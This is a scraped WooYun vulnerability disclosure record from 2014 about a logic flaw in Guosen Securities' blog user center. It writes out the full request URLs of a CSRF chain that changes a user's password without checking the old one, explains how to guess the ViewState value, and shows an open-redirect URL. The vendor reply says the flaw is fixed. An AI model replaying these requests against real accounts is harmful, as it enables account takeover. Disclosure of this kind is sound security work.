{"id": 54738, "wybug_id": "wooyun-2014-063493", "wybug_title": "国信证券一处逻辑漏洞", "wybug_corp": "国信证券", "wybug_author": "terrying", "wybug_date": "2014-06-04 15:09", "wybug_open_date": "2014-07-23 20:16", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "跳转", "设计不当", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向公众公开  简要描述： 乌云币都拿去买衣服了，账号都没乌云币会不会被嘲笑呢？ 详细说明：  N久没玩了，一玩就冒着撞洞的风险→ WooYun: 国信证券任意用户密码修改漏洞 但既然厂商都说修复了，那就放心多了，问题还是有的~~问题出在修改密码的请求，并没有验证原密码【验证原密码在另外请求中验证】，另外发现这个请求还存在CSRF。YY一下：如果再来个XSS~~~~验证过程时发现这个还是很恶心的，如修改密码请求：\nhttp://blog.guosen.com.cn/usercenter/infoCenter/pwdChange.jsf?AJAXREQUEST=j_id_jsp_547915581_0&formId=formId&formId%3Auname=testxsstest1%40126.com&formId%3AoldPwd=12341234&formId%3AnewPwd=qwerqwer&formId%3AconfirmPwd=qwerqwer&javax.faces.ViewState=j_id2&formId%3Asave_btn=formId%3Asave_btn&\njavax.faces.ViewState=j_id2如果这个参数不对的话则返回404~~~\n\n如果只有在用户访问了修改密码的页面才可利用的CSRF也太鸡肋了，于是乎发现要一步一步按着正常请求一个一个发出则可正常执行修改密码请求所以这个CSRF发起的请求有点多~~\n进入个人中心http://blog.guosen.com.cn/usercenterhttp://blog.guosen.com.cn/usercenter/infoCenter/customiseSetting.jsfhttp://blog.guosen.com.cn/usercenter/infoCenter/customiseSetting.jsf?AJAXREQUEST=j_id_jsp_1760869216_0&form_id=form_id&form_id%3Aj_id_jsp_1760869216_5=&form_id%3AavatarHid=http%3A%2F%2Fblog.guosen.com.cn%2Fcgui%2Fimages%2Fdefault.jpg&form_id%3AdefaultAvatarHid=http%3A%2F%2Fblog.guosen.com.cn%2Fcgui%2Fimages%2Fdefault.jpg&form_id%3Afour=0&form_id%3Ay=0&form_id%3Aj_id_jsp_1760869216_10=&javax.faces.ViewState=j_id1&form_id%3Aj_id_jsp_1760869216_2=form_id%3Aj_id_jsp_1760869216_2&http://blog.guosen.com.cn/usercenter/infoCenter/customiseSetting.jsf?AJAXREQUEST=j_id_jsp_1760869216_0&form_id=form_id&form_id%3Aj_id_jsp_1760869216_5=&form_id%3AavatarHid=http%3A%2F%2Fblog.guosen.com.cn%2Fcgui%2Fimages%2Fdefault.jpg&form_id%3AdefaultAvatarHid=http%3A%2F%2Fblog.guosen.com.cn%2Fcgui%2Fimages%2Fdefault.jpg&form_id%3Afour=0&form_id%3Ay=0&form_id%3Aj_id_jsp_1760869216_10=&javax.faces.ViewState=j_id1&form_id%3Aj_id_jsp_1760869216_3=form_id%3Aj_id_jsp_1760869216_3&http://blog.guosen.com.cn/usercenter/infoCenter/customiseSetting.jsf?AJAXREQUEST=j_id_jsp_1760869216_0&form_id=form_id&form_id%3Aj_id_jsp_1760869216_5=&form_id%3AavatarHid=http%3A%2F%2Fblog.guosen.com.cn%2Fcgui%2Fimages%2Fdefault.jpg&form_id%3AdefaultAvatarHid=http%3A%2F%2Fblog.guosen.com.cn%2Fcgui%2Fimages%2Fdefault.jpg&form_id%3Afour=0&form_id%3Ay=0&form_id%3Aj_id_jsp_1760869216_10=&javax.faces.ViewState=j_id1&form_id%3Aj_id_jsp_1760869216_4=form_id%3Aj_id_jsp_1760869216_4&修改http://blog.guosen.com.cn/usercenter/infoCenter/customiseSetting.jsf?AJAXREQUEST=j_id_jsp_1760869216_0&form_id=form_id&form_id%3Aj_id_jsp_1760869216_5=&form_id%3AavatarHid=http%3A%2F%2Fblog.guosen.com.cn%2Fcgui%2Fimages%2Fdefault.jpg&form_id%3AdefaultAvatarHid=http%3A%2F%2Fblog.guosen.com.cn%2Fcgui%2Fimages%2Fdefault.jpg&form_id%3Afour=0&form_id%3Ay=0&form_id%3Aj_id_jsp_1760869216_10=&javax.faces.ViewState=j_id1&form_id%3Aj_id_jsp_1760869216_38=form_id%3Aj_id_jsp_1760869216_38&http://blog.guosen.com.cn/usercenter/infoCenter/pwdChange.jsf修改密码http://blog.guosen.com.cn/usercenter/infoCenter/pwdChange.jsf?AJAXREQUEST=j_id_jsp_547915581_0&formId=formId&formId%3Auname=testxsstest%40126.com&formId%3AoldPwd=12341234&formId%3AnewPwd=qwerqwer&formId%3AconfirmPwd=qwerqwer&javax.faces.ViewState=j_id3&formId%3Asave_btn=formId%3Asave_btn&\n问题主要是修改密码请求的oldPwd=12341234没有验证，直接将newPwd=qwerqwer写进数据库，呵呵~~~前面的请求也有一个类似【javax.faces.ViewState=j_id2】作用的参数，因此多尝试几次就可以成功，而且经过多次测试发现数字变化不超过3So Easy~另外，再送一个URL跳转：https://blog.guosen.com.cn/sso/login?service=http%3A%2F%2Fwww.baidu.com   漏洞证明：  进入个人中心CSRF\n\n进入修改密码页面CSRF\n\n修改密码CSRF\n\n   修复方案：  你懂的   版权声明：转载请注明来源 terrying@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-06-06 17:59 厂商回复： 已经修复问题，再次感谢terrying对国信证券的关注和支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-05 09:44 |    \t\t国信证券(乌云厂商)\t\t \n  非常感谢反馈，我们正在进行确认和处理    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}